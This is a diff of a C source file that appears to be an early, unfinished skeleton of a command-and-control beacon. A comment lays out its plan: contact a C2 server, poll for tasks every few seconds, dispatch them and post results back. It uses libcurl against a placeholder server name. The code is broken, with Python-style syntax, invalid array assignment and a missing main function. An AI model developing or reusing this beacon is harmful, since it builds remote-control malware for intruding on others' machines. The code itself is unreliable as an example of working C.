@@ -1,12 +1,21 @@
+/**post request, try initial communcation with c2, when working->
+every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->post to payload**/
+#include <time.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <curl/curl.h>
 
 char servername[]="placeholder";
+void tasks(){
+    while(1){
+        sleep(60);
+        char tasks[]=gettasks();
 
-int main(){
+
 
 }
-
+}
 char * gettasks(){
     auto curl = curl_easy_init();
     if (curl) {
@@ -32,24 +41,6 @@ char * gettasks(){
     if(response==200):
         dotasks(response);
 }
-
-
-void tasks(){
-    while(1){
-        sleep(60);
-        char tasks[]=gettasks();
-
-
-
-}
-}
-/**post request, try initial communcation with c2, when working->
-every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->post to payload**/
-#include <time.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-
 
 #define SLEEP 10
 
